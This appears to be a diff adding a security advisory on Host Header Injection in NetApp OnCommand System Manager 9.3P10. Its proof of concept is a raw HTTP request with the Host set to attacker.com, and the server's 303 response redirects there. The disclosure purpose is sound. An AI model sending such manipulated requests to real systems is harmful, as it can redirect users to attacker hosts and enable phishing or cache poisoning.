@@ -1,0 +1,39 @@
+Host Header Injection
+----------------------
+
+We have identified that the  “OnCommand System Manager (NetApp Release 9.3P10)” is affected by Host Header Injection attacks. HTTP host header can be manipulated and cause the application to behave in unexpected ways. Any changes made to the header would just cause the request to be sent to a completely different Domain/IP address. This is due to that the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behaviour.
+
+
+Below Evidence is provided:
+
+Malicious Request:
+GET / HTTP/1.1
+Host: attacker.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+HTTP/1.1 303 See Other
+Date: Thu, 09 Sep 2021 09:54:07 GMT
+Server: Apache
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Expires: 0
+Location: http://attacker.com/sysmgr/SysMgr.html
+Content-Length: 245
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>303 See Other</title>
+</head><body>
+<h1>See Other</h1>
+<p>The answer to your request is located <a href="http://attacker.com/sysmgr/SysMgr.html">here</a>.</p>
+</body></html>
+
